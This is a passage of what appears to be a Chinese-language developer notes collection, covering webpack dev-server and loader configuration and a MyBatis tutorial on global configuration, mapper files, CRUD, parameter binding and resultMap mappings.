\"dev\": \"webpack-dev-server --contentBase src\"\n```\n同时修改index页面中script的src属性为`<script src=\"bundle.js\"></script>`\n\n> <font color=\"red\">注意</font>：对于webpack-cli版本为3.x的是使用webpack-dev-server命令，但版本为4.x时，该命令替换成了webpack serve。如果在4.x版本中使用webpack-dev-server命令，则会报如下错误：\n```\nCannot find module 'webpack/bin/config-yargs'\n```\n\n# webpack-dev-server实现自动打开浏览器、热更新和配置浏览器的默认端口号\n**方式1：（推荐）**\n- 修改`package.json`的script节点如下，其中`--open`表示自动打开浏览器，`--port 4321`表示打开的端口号为4321，`--hot`表示启用浏览器热更新，\n```json\n\"dev\": \"webpack-dev-server --hot --port 4321 --open --contentBase src\"\n```\n**方式2（不推荐使用）：**\n将`package.json文件设置中的script节点设置如下`\n```json\n\"dev\": \"webpack-dev-server\"\n```\n修改`webpack.config.js`文件\n```js\nvar path = require('path');\n\nvar webpack = require('webpack');//启动热更新第一步：在头部引入`webpack`模块：\nmodule.exports = {\n    entry: path.resolve(__dirname, 'src/js/main.js'),\n    output: {\n        path: path.resolve(__dirname, 'dist'), \n        filename: 'bundle.js' \n    },\n    devServer:{\n        hot:true, //启动热更新第二步：\n        open:true,\n        port:4321,\n        contentBase:'src'\n    },\n    plugins:[ \n        new webpack.HotModuleReplacementPlugin() //启动热更新第三步：\n    ]\n}\n```\n\n# 使用html-webpack-plugin插件配置启动页面\n由于使用`--contentBase`指令的过程比较繁琐，需要指定启动的目录，同时还需要修改index.html中script标签的src属性，而使用`html-webpack-plugin`插件配置启动页面后.<font color=\"red\">这个插件会在内存中生成一个html页面，并且还在此html中自动加上script标签，其src自动指向了bundles.js</font>, 所以启用这个插件后，我们可以在启动页index.html中不加上引入bundles.js的script标签\n1. 运行`cnpm i html-webpack-plugin --save-dev`安装到开发依赖\n2. 修改`webpack.config.js`配置文件如下：\n```js\n// 导入处理路径的模块\nvar path = require('path');\n\n// 导入自动生成HTMl文件的插件\nvar htmlWebpackPlugin = require('html-webpack-plugin');\n\nmodule.exports = {\n  entry: path.resolve(__dirname, 'src/js/main.js'), // 项目入口文件\n  output: { // 配置输出选项\n      path: path.resolve(__dirname, 'dist'), // 配置输出的路径\n      filename: 'bundle.js' // 配置输出的文件名\n  },\n  plugins:[ // 添加plugins节点配置插件\n      new htmlWebpackPlugin({\n          template:path.resolve(__dirname, 'src/index.html'),//指定模板页面，将来会根据此模板页面在内存中生成启动页\n          filename:'index.html'//自动生成的启动页的名称\n      })\n  ]\n}\n```\n3. 修改`package.json`中`script`节点中的dev指令如下：\n要想使用html-webpack-plugin的前提是有webpack-dev-server\n```\n\"dev\": \"webpack-dev-server\"\n```\n4. <font color=\"red\">将index.html中script标签注释掉，因为`html-webpack-plugin`插件会自动把bundle.js注入到index.html页面中！</font>\n\n\n# webpack处理文件\n<font color=\"red\">webpack打包编译一个文件时要做的事情</font>\n当webpack打包编译一个文件时,此时webpack会到`webpack.config.js`文件中找到rules的属性，来获取此文件类型的匹配和处理规则，来调用对应的loader处理。当后一个loader调用完毕后，会把处理的结果直接交给webpack进行打包合并，最终输出到bundle.js中\n\nes6 的import只支持js，但可以通过webpack的打包处理文件的特性使import支持导入样式文件\n\n## 使用webpack打包css文  件\n1. 运行`cnpm i style-loader css-loader --save-dev`\n2. 在`webpack.config.js`的module属性中添加rules属性\n```json\nmodule: { // 用来配置第三方loader模块的\n  rules: [ // rules属性是一个数组，存放了所有的非js文件类型的匹配和处理规则\n    //`use`表示使用哪些模块来处理`test`所匹配到的文件；`use`中相关loader模块的调用顺序是从后向前调用的；及css-loader先处理再style-loader处理\n    { test: /\\.css$/, use: ['style-loader', 'css-loader'] }//处理css文件的规则,这个顺序不能变，\n  ]\n}\n```\n\n## 使用webpack打包less文件\n1. 运行`cnpm i less-loader less -D`\n2. 修改`webpack.config.js`这个配置文件：\n```\n{ test: /\\.less$/, use: ['style-loader', 'css-loader', 'less-loader'] },\n```\n\n## 使用webpack打包sass文件\n1. 运行`cnpm i sass-loader node-sass --save-dev`\n2. 在`webpack.config.js`中添加处理sass文件的loader模块：\n```\n{ test: /\\.scss$/, use: ['style-loader', 'css-loader', 'sass-loader'] }\n```\n\n## 使用webpack处理css中的路径\n默认情况下，webpack是无法处理css文件中的url地址，不管是字体库还是图片的url，只要是url地址，就处理不了\n**解决方法：**\n1. 运行`cnpm i url-loader file-loader --save-dev`\n2. 在`webpack.config.js`中添加处理url路径的loader模块：\n```\n{ test: /\\.(png|jpg|gif|bmp?jpeg)$/, use: 'url-loader' }\n{ test: /\\.(ttf|eot|svg|woff|woff2)$/, use: 'url-loader' }\n```\n3. 可以通过`limit`指定进行base64编码的图片大小；只有小于指定字节（byte）的图片才会进行base64编码：\n```\n{ test: /\\.(png|jpg|gif)$/, use: 'url-loader?limit=43960' },\n```\n\n## 使用postCSS来解决css兼容性问题\n由于css兼容性问题， 同一个css语句在chrome能用，但是在IE上就可能用不了。 \n为了解决这个问题，我们可以使用postCSS\npostCSS可以帮我们完成css兼容性问题， 有关postCSS的使用如下：\n1. 使用`npm i postcss-loader autoprefixer -D`命令来安装相关插件\n2. 在项目根目录中创建postcss的配置文件`postcss.config.js`, 并初始化如下配置：\n```\nconst autoprefixer = require('autoprefixer') // 导入自动添加前缀的插件\nmodule.exports = {\n plugins: [autoprefixer] // 挂载插件\n}\n```\n3. 在webpack.config.js的`module->rules`数组中， 修改css的loader规则如下：\n```\nrules:[\n    { test: /\\.css$/, use: ['style-loader', 'css-loader','postcss-loader'] }\n]\n```\n\n## 使用babel处理高级JS语法\n1. 运行`cnpm i babel-core babel-loader babel-plugin-transform-runtime --save-dev`安装babel的相关loader包\n2. 运行`cnpm i babel-preset-es2015 babel-preset-stage-0 --save-dev`安装babel转换的语法\n3. 在`webpack.config.js`中添加相关loader模块，其中需要注意的是，一定要把`node_modules`文件夹添加到排除项：\n```\n{ test: /\\.js$/, use: 'babel-loader', exclude: /node_modules/ }\n```\n4. 在项目根目录中添加`.babelrc`文件，并修改这个配置文件如下：\n```\n{\n    \"presets\":[\"es2015\", \"stage-0\"],\n    \"plugins\":[\"transform-runtime\"]\n}\n```\n5. **注意：语法插件`babel-preset-es2015`可以更新为`babel-preset-env`，它包含了所有的ES相关的语法；**\n\n# '@/'路径\n@/ 是webpack设置的路径别名，代表什么路径，要看webpack的build文件夹下webpack.base.conf.js里面对于@是如何配置\n```conf\nresolve: {\n    // 路径别名\n    alias: {\n      'public': path.resolve(__dirname, '../public'),\n      'vue': 'vue/dist/vue.js',\n      '@': path.resolve('src'),\n    }\n  },\n```\n上述例子 @/ 代表着到src这个文件夹的路径。"
  },
  {
    "title": "./notes/back-end/Mybatis.md",
    "body": "# MyBatis简介\n- MyBatis 是支持定制化 SQL、存储过程以及高级映射的优秀的持久层框架。\n- MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。\n- MyBatis可以使用简单的XML或注解用于配置和原始映射，在实际开发中，常用xml方式，因为sql语句经常变化，如果用注解的话，是将sql语句写在类里面，从而导致每次修改sql语句，都要找到对应的类。将接口和Java的POJO（Plain Old Java Objects，普通的Java对象）映射成数据库中的记录\n- MyBatis是一个半自动的ORM(Object Relation Mapping)框架\n\n## Mybatis历史\n原是Apache的一个开源项目iBatis, 2010年6月这个项目由Apache Software Foundation 迁移到了Google Code，随着开发团队转投Google Code旗下， iBatis3.x正式更名为MyBatis ，代码于2013年11月迁移到Github（下载地址见后）。iBatis一词来源于“internet”和“abatis”的组合，是一个基于Java的持久层框架。 iBatis提供的持久层框架包括SQL Maps和Data Access Objects（DAO）\n\n## 现有持久化技术对比\n1. JDBC\n– SQL夹在Java代码块里，耦合度高导致硬编码内伤\n– 维护不易且实际开发需求中sql是有变化，频繁修改的情况多见 \n2. Hibernate和JPA\n– 长难复杂SQL，对于Hibernate而言处理也不容易\n– 内部自动生产的SQL，不容易做特殊优化。\n– 基于全映射的全自动框架，大量字段的POJO进行部分映射时比较困难。导致数据库性能下降。\n3. MyBatis\n- 对开发人员而言，核心sql还是需要自己优化\n- sql和java编码分开，功能边界清晰，一个专注业务、一个专注数据。\n\n# HelloWorld\n1. 导入jar\nmyBatis.jar, mysql-connector-java.jar, log4j.jar\n2. 创建MyBatis的核心(全局)配置文件MyBatis-config.xml，并配置\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE configuration PUBLIC \"-//mybatis.org//DTD Config 3.0//EN\" \"http://mybatis.org//dtd//mybatis-3.config.dtd\">\n<configuration>\n\t<!-- 设置连接数据库的环境\n\t\t可以在<environments>标签下配置多个连接数据库的环境，通过default属性来配置使用哪个环境\n\t\ttransactionManager, dataSource都必须要有\n\t -->\n\t <environments default=\"development\">\n\t\t<environment id=\"development\">\n\t\t\t<!-- 该标签type有两个值：JDBC,  MANAGED -->\n\t\t\t<!-- JDBC: 使用JDBC原生的事务管理方式，即提交和回滚都需要受体处理 -->\n\t\t\t<transactionManager type=\"JDBC\"/>\n\t\t\t<!-- 该标签type有三个值：POOLED, UNPOOLED, JNDI -->\n\t\t\t<dataSource type=\"POOLED\">\n\t\t\t\t<property name=\"driver\" value=\"com.mysql.jdbc.Driver\" />\n\t\t\t\t<property name=\"url\" value=\"jdbc:mysql://localhost:3306/ssm?serverTimezone=UTC\" />\n\t\t\t\t<property name=\"username\" value=\"root\" />\n\t\t\t\t<property name=\"password\" value=\"123456\" />\n\n\t\t\t</dataSource>\n\t\t</environment>\n\t</environments>\n\n\t<!-- 引入映射文件 -->\n\t<mappers>\n\t\t<mapper resource=\"UserMapper.xml\"/>\n\t</mappers>\n</configuration>\n```\n3. 创建mapper接口\n```java\npackage com.atguigu.mapper\n\npublic interface UserMapper {\n\tUser getUserById(String uid);\n}\n```\n4. 创建映射文件XXXMapper.xml, 并配置. \n实现XXXMaper.xml与mapper接口两个绑定:\n(1) 接口全限定名要和映射文件的namespace保持一致\n(2) 接口中方法名和SQL语句的id保持一致\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE mapper\n        PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\"\n        \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\">\n\n<mapper namespace=\"com.atguigu.mapper.UserMapper\">\n\t<select id=\"getUserById\" resultType=\"com.atguigu.bean.User\"> \n\t\tselect * from user where uid = #{id}\n\t</select>\n</mapper>\n```\n5. 获取mybatis操作数据库的会话对象sqlSession\n```java\npublic void test() throws IOException{\n\t//获取会话对象sqlSession\n\tInputStream is = Resources.getResourceAsStream(\"mybatis-config.xml\");\n\tSqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(is);\n\tSqlSession sqlSession = sqlSessionFactory.openSession();\n\ttry{\n\t\t//getMapper()的作用：通过动态代理动态生成UserMapper的代理实现类\n\t\tUserMapper mapper = sqlSession.getMapper(UserMapper.class);\n\t\tSystem.out.println(mapper.getClass().getName());\n\t\tUser user = mapper.getUserById(\"1\");\n\t\tSystem.out.println(user);\n\t}finally{\n\t\tsqlSession.close();\n\t}\n}\n```\nSqlSession 的实例不是线程安全的，因此是不能被共享的。 SqlSession每次使用完成后需要正确关闭，这个关闭操作是必须的\nSqlSession可以直接调用方法的id进行数据库操作，但是我们一般还是推荐使用SqlSession获取到Dao接口的代理类，执行代理对象的方法，可以更安全的进行类型检查操作\n\n# MyBatis全局配置文件\nMyBatis 的配置文件包含了影响 MyBatis 行为甚深的设置（settings）和属性（properties）信息。文档的顶层结构如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124807.png)\n\n## properties属性\nxml中使用${}方式获取property值: 使用`<properties>`标签\n第一种方式, 直接设置\n```xml\n<properties>\n\t<property name=\"jdbc.driver\" value=\"com.mysql.jdbc.Driver\"/>\n</properties>\n\n<property name=\"driver\" value=\"${jdbc.driver}\" />\n```\n\n第二种方式：创建properties文件\n```property\njdbc.driver=com.mysql.jdbc.Driver\n```\n```xml\n<!-- resource: 在类路径下访问资源文件\n\t url: 在网络路径或磁盘路径下访问资源文件-->\n<properties resources=\"jdbcProperties\"></properties>\n\n<property name=\"driver\" value=\"${jdbc.driver}\" />\n```\n\n## setting属性\n这是 MyBatis 中极为重要的调整设置，它们会改变MyBatis 的运行时行为。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124815.png)\n\n```xml\n<settings>\n\t<setting name=\"mapUnderscoreToCamelCase\" value=\"true\"/>\n</settings>\n```\n\n## typeAliases别名处理器\n类型别名是为 Java 类型设置一个短的名字，可以方便我们引用某个类。\n```xml\n<typeAliases>\n\t<typeAlias type=\"com.atguigu.bean.Employee\" alias=\"employee\"/>\n</typeAliases>\n```\n类很多的情况下，可以批量设置别名这个包下的每一个类创建一个默认的别名，就是简单类名小写。\n```xml\n<typeAliases>\n\t<package name=\"com.atguigu.bean\" />\n</typeAliases>\n```\n也可以使用@Alias注解为其指定一个别名\n```java\n@Alias(\"emp\")\npublic class Employee{\n```\n\n## typeHandlers类型处理器\n无论是 MyBatis 在预处理语句（PreparedStatement）中设置一个参数时，还是从结果集中取出一个值时， 都会用类型处理器将获取的值以合适的方式转换成 Java 类型。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124825.png)\n\n### 日期类型的处理\n日期和时间的处理，JDK1.8以前一直是个头疼的问题。我们通常使用JSR310规范领导者Stephen Colebourne创建的Joda-Time来操作。1.8已经实现全部的JSR310规范了。\n日期时间处理上，我们可以使用MyBatis基于JSR310（Date and Time API）编写的各种日期时间类型处理器。 MyBatis3.4以前的版本需要我们手动注册这些处理器，以后的版本都是自动注册的\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124834.png)\n\n### 自定义类型处理器\n我们可以重写类型处理器或创建自己的类型处理器来处理不支持的或非标准的类型。 \n• 步骤：\n1）实现org.apache.ibatis.type.TypeHandler接口或者继承org.apache.ibatis.type.BaseTypeHandler\n2）指定其映射某个JDBC类型（可选操作）\n3）在mybatis全局配置文件中注册\n\n## plugins插件\n插件是MyBatis提供的一个非常强大的机制，我们可以通过插件来修改MyBatis的一些核心行为。插件通过动态代理机制，可以介入四大对象的任何一个方法的执行。后面会有专门的章节我们来介绍mybatis运行原理以及插件\n```java\nExecutor (update, query, flushStatements, commit, rollback, getTransaction, close, isClosed)\nParameterHandler (getParameterObject, setParameters) \nResultSetHandler (handleResultSets, handleOutputParameters) \nStatementHandler (prepare, parameterize, batch, update, query)\n```\n\n## environments环境\nMyBatis可以配置多种环境，比如开发、测试和生产环境需要有不同的配置。\n每种环境使用一个environment标签进行配置并指定唯一标识符\n可以通过environments标签中的default属性指定一个环境的标识符来快速的切换环境\n其中transactionManager, dataSource必须要配置，否则会报错\n\n### transactionManager\ntype： JDBC | MANAGED | 自定义\n– JDBC：使用了 JDBC 的提交和回滚设置，依赖于从数据源得到的连接来管理事务 JdbcTransactionFactory\n– MANAGED：不提交或回滚一个连接、让容器来管理事务的整个生命周期（比如 JEE 应用服务器的上下文）。 ManagedTransactionFactory\n– 自定义：实现TransactionFactory接口，type=全类名/别名\n\n### dataSource\ntype： UNPOOLED | POOLED | JNDI | 自定义\n– UNPOOLED：不使用连接池，UnpooledDataSourceFactory\n– POOLED：使用连接池， PooledDataSourceFactory\n– JNDI： 在EJB 或应用服务器这类容器中查找指定的数据源\n– 自定义：实现DataSourceFactory接口，定义数据源的获取方式。\n\n• 实际开发中我们使用Spring管理数据源，并进行\n事务控制的配置来覆盖上述配置\n\n## databaseIdProvider环境\nMyBatis 可以根据不同的数据库厂商执行不同的语句。\n```xml\n<!-- type=\"DB_VENDOR\"：vendorDatabaseIdProvider, 作用就是得到数据库厂商的标识(驱动getDatabaseProductName())， mybatis就能根据数据库厂商标识来执行不同的sql\nMySQL, Oracle, SQL Server,... -->\n<databaseIdProvider type=\"DB_VENDOR\">\n\t<!-- 为不同的数据库厂商起别名 -->\n\t<property name=\"MySQL\" value=\"mysql\"/>\n\t<property name=\"Oracle\" value=\"oracle\"/>\n\t<property name=\"SQL Server\" value=\"sqlserver\"/>\n</databaseIdProvider>\n```\n\n- Type： DB_VENDOR\n使用MyBatis提供的VendorDatabaseIdProvider解析数据库厂商标识。也可以实现DatabaseIdProvider接口来自定义。 \n  - Property-name：数据库厂商标识\n  - Property-value：为标识起一个别名，方便SQL语句使用databaseId属性引用\n\n使用：通过databaseId属性\n```xml\n<select id=\"getEmpsByDeptId\" resultType=\"Emp\" databaseId=\"mysql\">\n  ...\n</select>\n```\n\n## mapper映射\n将sql映射到全局配置中\n- 注册配置文件\nresource: 引用类路径下的sql映射文件，例：mybatis/mapper/EmpMapper.xml\nurl: 引用网络路径或磁盘路径下的sql文件， 例：file://var/mappers/EmpMapper.xml\n- 注册接口\nclass: 引用(注册)接口\n  - 有sql映射文件，映射文件名必须哟啊和接口同名，并且放在与接口同一目录下\n  - 没有sql映射文件，所有的sql都是利用注解写在接口上\n```xml\n<mapper class=\"com.atguigu.mybatis.EmpMapper>\n```\n- 批量注入\n```xml\n<mappers>\n\t<package name=\"com.atguigu.dao\"/>\n</mappers>\n```\n这种方式要求SQL映射文件名必须和接口名相同并且在同一目录下\n\n# MyBatis-映射文件\n映射文件指导着MyBatis如何进行数据库增删改查，有着非常重要的意义；\n- cache –命名空间的二级缓存配置\n- cache-ref – 其他命名空间缓存配置的引用。\n- resultMap – 自定义结果集映射\n- parameterMap – 已废弃！老式风格的参数映射\n- sql –抽取可重用语句块。\n- insert – 映射插入语句\n- update – 映射更新语句\n- delete – 映射删除语句\n- select – 映射查询语句\n\n## insert、update、delete元素\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124843.png)\n\n## CRUD\nEmp.java\n```java\npublic class Emp {\n\tprivate Integer eid;\n\tprivate String ename;\n\tprivate int age;\n\tprivate String sex;\n\t/**set, get, constructor**/\n}\n```\n\nEmpMapper.java\n```java\npublic interface EmpMapper {\n\t/**\n \t * 返回值可以设置为int， 此时返回的结果结果表示受影响的行数\n\t *       可以设置boolean， 此时表示操作是否成功\n\t */\n\t//根据eid查询一个员工信息\n\tEmp getEmpByEid(String eid);\n\t//获取所有的员工信息\n\tList<Emp> getAllEmp();\n\t//添加所有员工信息\n\tvoid addEmp(Emp emp);\n\t//修改员工信息\n\tvoid updateEmp(Emp emp);\n\t//删除员工信息\n\tvoid deleteEmp(String eid);\n\n}\n```\nEmpMapper.xml\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE mapper PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\" \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\">\n<mapper namespace=\"com.atguigu.mybatis.mapper.EmpMapper\">\n    <select id=\"getEmpByEid\" resultType=\"emp\">\n        select eid, ename, age, sex from emp where eid = #{eid}\n    </select>\n    <select id=\"getAllEmp\" resultType=\"emp\">\n        selecte id, ename, age, sex from emp\n    </select>\n    <insert id=\"addEmp\">\n        insert into emp value(null, #{ename}, #{age}, #{sex})\n    </insert>\n    <update id=\"updateEmp\">\n        update emp set ename = #{ename},age= #{age},sex=#{sex} where eid = #{eid}\n    </update>\n    <delete id=\"deleteEmp\">\n        delete from emp where eid = #{eid}\n    </delete>\n</mapper>\n```\n\nTest.java\n```java\n@Test\npublic void test1() throws IOException {\n\tInputStream resourceAsStream = Resources.getResourceAsStream(\"mybatis-config.xml\");\n\tSqlSessionFactory build = new SqlSessionFactoryBuilder().build(resourceAsStream);\n\tSqlSession sqlSession = build.openSession();\n\tEmpMapper empMapper = sqlSession.getMapper(EmpMapper.class);\n\n\tEmp emp = empMapper.getEmpByEid(\"2\");\n\tSystem.out.println(emp);\n\n\tList<Emp> list = empMapper.getAllEmp();\n\tSystem.out.println(list);\n\n\tempMapper.addEmp(new Emp(null, \"admin\", 23, \"man\"));\n\tsqlSession.commit();//手动提交事务\n\tSystem.out.println(list);\n\n\tempMapper.updateEmp(new Emp(2, \"zhang\", 33, \"woman\"));\n\tsqlSession.commit();//手动提交事务\n\n\tempMapper.deleteEmp(\"5\");\n\tsqlSession.commit();//手动提交事务\n}\n```\n\n## 主键生成方式\n若数据库支持自动生成主键的字段（比如 MySQL 和 SQL Server），则可以设置useGeneratedKeys=”true”，然后再把keyProperty 设置到目标属性上。\n```xml\n<insert id=\"insertCustomer\" databaseId=\"mysql\" useGeneratedKeys=\"true\" KeyProperty=\"id\">\n\tinsert into emp(name, email, age) values (#{name}, #{email}, #{age})\n</insert>\n```\n\n而对于不支持自增型主键的数据库（例如Oracle），Oracle使用序列来模拟自增。 每次插入的数据的主键是从序列中拿到的值。则可以使用 selectKey 子元素：selectKey元素将会首先运行，id 会被设置，然后插入语句会被调用\n```xml\n<insert id=\"insertCustomer\" databaseId=\"oracle\">\n\t<!-- keyProperty的作用：将执行的sql语句的返回结果赋值给javaBean中的哪个属性 \n\t    order的作用： 用来设置<selectKey>标签的执行时间，有两个值，分别是before与after；before表示在插入sql语句之前执行；after表示在出入sql语句之后执行\n\t\tresultType的作用： sql语句的返回结果的类型-->\n\t<selectKey order=\"BEFORE\" keyProperty=\"id\" resultType=\"_int\">\n\t\t<!-- 获取dual数据库中crm表中的下一个序列号 -->\n\t\tselect crm_seq.nextval from dual\n\t</selectKey>\n\t<!-- 下面的#{id}的值，就是从上面得到的 -->\n\tinsert into customers2 (id, last_name, emial, age) values (#{id}, #{lastName}, #{email}, #{age})\n</insert>\n```\n\n## 参数取值\n- #{ }是预编译处理，MyBatis在处理#{ }时，它会将sql中的#{ }替换为？，然后调用PreparedStatement的set方法来赋值，传入字符串后，会在值两边加上单引号，如上面的值 “4,44,514”就会变成“ '4,44,514' ”；\n- \\${ }是字符串替换， MyBatis在处理\\${ }时,它会将sql中的${ }替换为变量的值，底层使用的是Statement。 传入的数据不会加两边加上单引号。\n注意：使用${ }会导致sql注入，不利于系统的安全性！\n\n大多情况下，我们取参数值应使用#{}， 但在原生jdbc不支持占位符的地方，我们只能使用${}进行取值，例如表名不支持占位符，所以我们在查询表中的信息时，表名的取值只能为\\${}, 即select * from ${table} \n\n## 参数传递\n- 单个参数：mybatis不会做任何处理\n#{}可以以任意的名字获取参数值\n${}只能以`${value}`或`${_parameter}`获取\n\n- 多个参数：mybatis会做特殊处理\n任意多个参数，都会被MyBatis重新包装成一个Map传入。Map的key是param1，param2或者0，1…，值就是参数的值\n#{}：可以通过#{0}, #{1}.. 或 #{param1}, #{param2}\n`${}`: 只可以通过`${param1}, ${param2}`..\n\n- 命名参数：为参数使用@Param起一个名字，MyBatis就会将这些参数封装进map中，key就是我们自己指定的名字\n多个参数同样会被封装成一个map，但此时，map的key可以是@Param注解指定的值\n#{}与${}都可以通过键的名字直接获取值，但是要注意\\${}的单引号问题\n\n- POJO： 如果多个参数正好是我们业务逻辑的数据模型，我们就可以直接传入pojo\n#{pojo的属性名}：取出传入的pojo的属性值\n#{}与${}都可以通过属性名直接获取属性值，但是要注意\\${}的单引号问题\n\n- Map： 如果多个参数不是我们业务逻辑的数据模型，没有对应的pojo,我们可以传入Map\n#{}和${}都可以通过键的名字直接获取值\n\n- List、Set、数组：mybatis会做特殊处理，都会被MyBatis重新包装成一个Map传入。List以list为键，list[0]为键1，list[2]为键二...。Array以array为键. array[0]为键1，array[1]为键2...\n我们可以通过@Param修改键名，例如`void deleteMoreByList(@Param(\"eids\")List<Integer> eids)`，此时eids[0]为键...\n[有关此点注意的地方](#one)\n${list[0]}, ${list[0]}...\n${array[0]}, ${array[0]}...\n\n## select元素\nSelect元素来定义查询操作。\n- Id：唯一标识符。用来引用这条语句，需要和接口的方法名一致\n- parameterType：参数类型。 可以不传，MyBatis会根据TypeHandler自动推断\n- resultType：返回值类型。 别名或者全类名，如果返回的是集合，定义集合中元素的类型。不能和resultMap同时使用\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409124852.png)\n\n### select查询的几种情况\n```java\n//1. 查询单行数据返回单个对象\npublic Employee getEmployeeById(integer id);\n\n//2. 查询多行数据返回对象的集合\npublic List<Employee> getAllEmps();\n\n//3. 查询当行数据返回Map集合\npublic Map<String, Object> getEmployeeByIdReturnMap(Integer id);\n\n//4. 查询多行数据返回Map集合\n@MapKey(\"id\")  //指定使用对象的那个属性来充当map的key\npublic Map<Integer, Employee> getAllEmpsReturnMap();\n```\n\n### 自动映射resultMap\n- 全局setting设置\nautoMappingBehavior默认是PARTIAL，开启自动映射的功能, 此时唯一的要求是列名和javaBean属性名一致，如果autoMappingBehavior设置为null则会取消自动映射。数据库字段命名规范，POJO属性符合驼峰命名法，比如说数据库中字段为last_name,而实体类的属性为lastName。我们可以开启自动驼峰命名规则映射功能，mapUnderscoreToCamelCase=true，默认是开启的。\n- 自定义resultMap，实现高级结果集映射\n\n#### resultMap\n- id： 用来设置主键的映射关系，底层会优化\n- result: 设置非主键的映射关系\n- association – 一个复杂的类型关联;许多结果将包成这种类型嵌入结果映射 – 结果映射自身的关联,或者参考一个\n- collection：专门用于处理一对多和多对多的关系\n```xml\n<!-- 自定义某个javaBean的封装规则\n\ttype: 需要自定义映射规则的java类型\n\tid：唯一id -->\n<resultMap type=\"com.atguigu.mybatis.bean.Emp\" id=\"MyEmp\">\n\t<!-- 指定主键列的封装规则\n\t   id：定义主键会底层优化\n\t   column: 指定哪一列\n\t   property: 指定对应的JavaBean属性 -->\n\t   <id column=\"id\" property=\"id\"/>\n\t   <!-- 定义普通列封装规则 -->\n\t   <result column=\"last_name\" property=\"lastName\"/>\n\n\t   <!-- 将Emp中的dept属性中的count属性 对应 表中的dcount列 -->\n\t   <result column=\"dcount\" property=\"dept.count\"/>\n\n\n\t   <!-- 把Dept中的did属性did属性 对应 表中的did列, 把dname属性 对应 表中的dname列\n\t        然后把Emp中的dept属性 对应 Dept-->\n\t   <association property =\"dept\" javaType=\"com.atguigu.mybatis.bean.Dept\">\n\t\t\t<id column=\"did\" property=\"did\"/>\n\t\t\t<result column=\"dname\" property=\"dname\"/>\t\n\t   </association>\n\n\t   <!-- select: 分步查询的SQL的id， 即 接口的全限定名.方法名, 或者是当前xml文件中selct或者sql标签的id\n\t        column: 即将指定列的值传入目标方法中，注：此列必须在第一次sql查询中查询过，否则会报错 -->\n\t   <association property =\"school\" select=\"com.atguitu.mapper.DeptMapper.getSchoolByDid\" column=\"sid\"/>\n\t   <collection property =\"compa\" select=\"com.atguitu.mapper.CompaMapper.getCompaByDid\" column=\"cid\"/>\n\n     <collection property=\"children\" ofType=\"resAll\" select=\"selectRecursionRes\" column=\"{resID=resID,belongTo=belongTo}\"/>\n\n\t   <!-- 其他不指定的列会自动封装 -->\n</resultMap>\n\n<!-- resultMap: 自定义结果集映射规则 -->\n<select id=\"getEmpById\" resultMap=\"MyEmp\">\n\tselect * from emp where id=#{id}\n</select>\n```\n\n#### resultMap继承\n```xml\n<resultMap id=\"CocBeanResult\" type=\"CocBean\">  \n    <result property=\"name\" column=\"NAME\"/>  \n    <result property=\"volume\" column=\"VOLUME\"/>  \n</resultMap>\n\n//继承CocBeanResult中的映射关系\n<resultMap id=\"simpleRow\" type=\"CocTreeNode\" extends=\"CocBeanResult\">  \n    <result property=\"level1\" column=\"LEVEL1\"/>  \n    <result property=\"level2\" column=\"LEVEL2\"/>  \n</resultMap>\n```\n\n#### Subquery\nSubquery/Inner query/Nested query is a query within another SQL query and embedded within the WHERE clause.\n```sql\nselect * from author where userID in (select id from user)\n```\nSo there are in fact two statements here. Let’s define each select statement and resultMap:\n\n```sql\n<resultMap id=\"AuthorSubMap\" type=\"Author\">\n\t<id property=\"id\" column=\"author.id\" />\n\t<result property=\"realName\" column=\"realName\" />\n\t<result property=\"IDCard\" column=\"IDCard\" />\n\t<association property=\"user\" column=\"userID\" javaType=\"User\" select=\"findById\"/>\n</resultMap>\n<select id=\"findById\" parameterType=\"int\" resultType=\"User\">\n\tselect * from user where id=#{id}\n</select>\n<select id=\"selectAuthorSub\" resultMap=\"AuthorSubMap\">\n\tselect * from author \n</select>\n```\nIn the above settings, `<association>` will pass `userID` as parameter to `findById`.\n\n#### collection\n\n`<collection>` element works almost identically to `<association>`. But it is used to map a set of nested results like List.\n\n专门用于处理一对多和多对多的关系\n```xml\n<!-- \n\tofType: 指定集合中的类型， 不需要指定JavaType\n -->\n<collection property=\"emps\" ofType=\"Emp\">\n\t<id column=\"eid\" property=\"eid\">\n\t<result column=\"ename\" property=\"ename\">\n\t<result column=\"age\" property=\"age\">\n</collection>\n```\n```xml\n<collection property=\"roles\" ofType=\"java.lang.String\">\n\t<constructor>\n\t\t<arg column=\"roles\"/>\n\t</constructor>\n</collection>\n```\n\n#### 分步查询延迟加载\n只有collection与association标签才能使用分步查询\n延时加载是针对分步查询而使用的\n开启延时加载后，当使用分段查询时，如果要得到的数据可以不通过执行分布查询的sql而得到， 那么这个分步查询中的sql就不会执行\n```xml\n<settings>\n\t<!-- 开启延时加载 -->\n\t<setting name=\"lazyLoadingEnabled\" value=\"true\"/>\n\n\t<!-- 是否按需加载 -->\n\t<setting name=\"aggressiveLazyLoading\" value=\"false\"/>\n</settings>\n```\n此时所有的分步查询语句都会延时加载\n如果你想设置某个分步查询是否延时加载， 你可以通过设置fetchType属性\nfetchType属性有两个属性值, 分别是eager(立即加载)与lazy(延时加载)\n```xml\n<association property =\"school\" select=\"com.atguitu.mapper.DeptMapper.getSchoolByDid\" column=\"sid\" fetchType=\"eager\"/>\n```\n\n#### Result Maps collection does not contain value for错误\n**原因1:  resultMap的指向不正确**\n\n例如: 有如下内容:\n```xml\n<resultMap type=\"com.atguigu.mybatis.bean.Emp\" id=\"MyEmp\">\n    ...\n</resultMap>\n\n<select id=\"getEmpById\" resultMap=\"com.atguigu.mybatis.EmpMapper.MyEmp\">\n   